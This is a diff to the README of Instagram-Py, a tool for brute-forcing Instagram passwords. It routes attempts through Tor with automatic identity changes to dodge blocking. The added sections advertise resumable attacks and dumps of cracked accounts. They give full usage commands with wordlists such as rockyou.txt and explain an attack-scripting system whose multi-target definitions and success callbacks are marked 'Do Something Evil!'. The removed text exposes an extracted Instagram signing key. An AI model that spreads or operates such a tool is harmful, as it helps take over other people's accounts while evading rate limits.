@@ -26,7 +26,7 @@
 
 
   
-.. image:: https://raw.githubusercontent.com/deathsec/instagram-py/master/preview.gif
+.. image:: https://raw.githubusercontent.com/deathsec/instagram-py/v2.x.x/preview.gif
 
 .. image:: http://forthebadge.com/images/badges/built-with-love.svg
       :target: #
@@ -70,12 +70,35 @@
 | but if your **tor** installation is **misconfigured** then the blame is on you.
 
 
+------------
+ Features
+------------
+
+* Instagram-Py Scripting
+
+  Craft your own python script which will embed into Instagram-Py for Maximum Customization of your
+  brute force attack , example: What if you want a message sent to your phone when an account is hacked?
+
+* Resumes Attacks when the same wordlist is used on the same Username
+* Dumps successfully cracked accounts in the dump
+* Maximum Customization! ( This includes multiple attack vectors! )
+* Fast and Clean Code , no ugly selenum drivers! ( Pure Requests )
+* Elegant Tor Identity Change with Stem ( Tor's Official Library for Python )
+
 
 **Depends on**: python3 , tor ,  requests , requests[socks] , stem
 
 ==============
  Installation
 ==============
+---------------------------------
+ Upgrading Instagram-Py with pip
+---------------------------------
+
+::
+
+ $ sudo pip3 install instagram-py --upgrade
+
 
 -------------------------------
  using pip to get Instagram-py
@@ -91,49 +114,32 @@
  $ sudo pip3 install stem
  $ sudo pip3 install instagram-py
  $ instagram-py # installed successfully
- $ # Now lets copy the config file to your hard drive!
- $ wget -O ~/instapy-config.json "https://git.io/v5DGy"
+ $ # Configuration is Super Important so Lets Create One
+ $ instagram-py --create-configuration # follow the steps... 
 
 --------------------------------
     Configuring Instagram-Py
 --------------------------------
 
-Open your configuration file found in your home directory , this file is **very important**
-located at **~/instapy-config.json** , do not change anything except tor configuration
+**As of v2.0.0 Configuration is Simply done by Passing an Argument to Instagram-Py**
 
 ::
 
- $ vim ~/instapy-config.json # open it with your favorite text editior!
+ $ instagram-py --create-configuration
+ $      # OR
+ $ instagram-py -cc
 
-**The configuration file looks like this ( do not copy this , download the file from repo )**
+
+
+**Or if you just want the default settings without the annoying questions then**
 
 ::
 
- {
-  "api-url" : "https://i.instagram.com/api/v1/",
-  "user-agent" : "Instagram 10.26.0 Android (18/4.3; 320dp..... ",
-  "ig-sig-key" : "4f8732eb9ba7d1c8e8897a75d6474d4eb3f5279137431b2aafb71fafe2abe178",
-  "ig-sig-version" : "4",
-  "tor" : { 
-     "server" : "127.0.0.1",
-     "port" : "9050",
-     "protocol" : "socks5",
-     "control" : {
-           "password" : "",
-           "port" : "9051"
-       }
-   }
-    
- }
+ $ instagram-py --create-configuration --default-configuration
+ $      # OR
+ $ instagram-py -cc -dc
 
 
-**api-url** : do not change this unless you know what you are doing
-
-**user-agent** : do not change this unless you know your stuff
-
-**ig-sig_key** : never change this unless new release, this is extracted from the instagram apk file
-
-**tor** : change everything according to your tor server configuration , do not mess up!
 
 --------------------------------------------------
     Configuring Tor server to open control port
@@ -165,9 +171,161 @@ open your **tor configuration** file usually located at **/etc/tor/torrc**
 
 **Finally** , now you can use instagram-py!
 
+**Instagram-Py Scripting lets you run Custom Python Scripts Inside Instagram-Py!**
+
+**Never Run Instagram-Py with Multiple Instance! , Use Instagram-Py Scripting Instead!**
+
+
 ::
 
- $ instagram-py your_account_username path_to_password_list
+ $ instagram-py -u your_account_username -pl path_to_password_list
+
+
+**Note**: Without the **-c** optional argument , instagram-py **will not continue the attack**
+
+::
+
+ usage: instagram-py [-h] [--username USERNAME] [--password-list PASSWORD_LIST]
+                     [--script SCRIPT] [--inspect-username INSPECT_USERNAME]
+                     [--create-configuration] [--default-configuration]
+                     [--countinue] [--verbose]
+ 
+ optional arguments:
+   -h, --help            show this help message and exit
+   --username USERNAME, -u USERNAME
+                         username for Instagram account
+   --password-list PASSWORD_LIST, -pl PASSWORD_LIST
+                         password list file to try with the given username.
+   --script SCRIPT, -s SCRIPT
+                         Instagram-Py Attack Script.
+   --inspect-username INSPECT_USERNAME, -i INSPECT_USERNAME
+                         Username to inspect in the instagram-py dump.
+   --create-configuration, -cc
+                         Create a Configuration file for Instagram-Py with
+                         ease.
+   --default-configuration, -dc
+                         noconfirm for Instagram-Py Configuration Creator!
+   --countinue, -c       Countinue the previous attack if found.
+   --verbose, -v         Activate Verbose mode. ( Verbose level )
+
+ example: instagram-py -c -vvv -u instatestgod__ -pl rockyou.txt
+
+ Report bug, suggestions and new features at https://github.com/deathsec/instagram-py
+
+
+
+========================
+ Instagram-Py Scripting
+========================
+
+::
+
+ $ # To Run Instagram-Py Script
+ $ instagram-py -s [Script Location]
+ $      # OR
+ $ chmod +x attack_script.py
+ $ ./attack_script.py
+ $ # Please Make sure that attack_script.py has the shebang!
+ $ # Example: #!/usr/bin/instagram-py -s
+
+
+Instagram-Py now lets you run your custom scripts inside of it for maximum customization of your attacks.
+This Scripts are simple Python Scripts ( You Can just do anything that is possible with python )
+
+Refer the Wiki to get full information about Instagram-Py Scripting , https://github.com/deathsec/instagram-py/wiki
+Also look into the **examples** tree present in this repo , it contains simple example scripts.
+
+--------------------
+ Reserved Variables
+--------------------
+
+**Please do not use these without the given syntax**
+
+**global_password_list:**
+
+Declare this if you want to use this password list as the default fallback password list!
+
+::
+
+ #!/usr/bin/instagram-py -s 
+ # Do not forget the shebangs! from above , if you want to run it like a script
+ # Some Python Script Header Section
+ 
+ ....
+ # This is not mandatory if local password lists are declared which you will see later.
+ global_password_list = "{}/facebook.lst".format(os.path.expanduser('~'))
+
+
+**global_callback:**
+
+Declare this if you want this function callback to be called when any account is successfully cracked!
+
+::
+
+ #!/usr/bin/instagram-py -s
+ 
+ ....
+ # This is Optional
+ # Callback function syntax , do not change this!
+ # you can change the name...
+ def message_me_when_hacked(username , password):
+        # Use Twilio Free API to Send Messages to Your Phone
+        print("Hacked @" + username + " with Password " + password)
+ 
+ ....
+
+ global_callback = message_me_when_hacked
+
+ ....
+
+
+
+
+**usernames:**
+
+**This is the most important variable** , its of type dict and contains all information for the attack
+
+::
+
+ #!/usr/bin/instagram-py -s
+
+ ....
+
+ def very_important_ac_hacked(username , pass):
+        # Do Something Evil!
+
+ ....
+
+ # Do Whatever with python here
+
+ # This is Mandatory!
+
+ usernames = [ # do not use '{' , it will not work!
+                  {
+                        "id" : "Target Username" , # account username
+                        # Optional if global_password_list is declared!
+                        "password_list" : "Full Path to Wordlist" , # ~ does not work here!
+                        # use os.path.expanduser('~') for ~ ( Home Path Resolution! )
+                        "callback" : very_important_ac_hacked, # Optional
+                        "continue" : True, # Optional
+                        "verbose"  : 3, # Optional
+                  },
+                  { 
+                        # More Targets with the same syntax 
+                  }
+
+ ]
+
+
+
+
+**You Can Always View the Cracked Passwords Using this command!**
+
+::
+
+ $ instagram-py -i instatestgod__
+ $ # Displays record if it is cracked in the past!
+
 
 
 **Note**: Without the **-c** optional argument , instagram-py **will not continue the attack**
@@ -201,7 +359,7 @@ wish to recreate this program in any other language.
 
 ::
 
- $ instagram-py -vvv instatestgod__ password_list.lst
+ $ instagram-py -vvv -u instatestgod__ -pl password_list.lst
 
 **You can also use Instagram-Py as a module , so that you can also use it in your script**
 
@@ -292,23 +450,7 @@ because of wordlist encoding error which i ignored because all the worldlist hav
 
 Contribute anything you can to this repo **(Issues | Pull request)** , help is much **appreciated**.
 
----------------------
- How to contribute ?
----------------------
-
-* Fork **https://github.com/DeathSec/Instagram-Py** via **Github**
-* Clone the Forked repo to your computer
-* Create a new branch with the name linked to the problem ( optional )
-* Do your changes in the new branch
-
-::
-
- $ git clone https://github.com/yourusername/instagram-py
- $ git checkout -b "Your new branch name"
- $ # DO YOUR CHANGES
-
-* push the changes to your repo
-* Merge your branch through a simple **pull request** to my repo explaning the changes you made.
+**Please Refer CONTRIBUTING.rst for more information on contributing code!**
 
 
 ===========================
@@ -354,7 +496,6 @@ This is a simple script to conduct a bructe force attack using instagram-py as a
  '''
  # USE THIS IF YOU WANT
  cli.PrintHeader()
- cli.PrintResource( username , password)
  cli.PrintDatetime()
  '''
  session = InstagramPySession(username , password , DEFAULT_PATH , DEFAULT_PATH , cli)
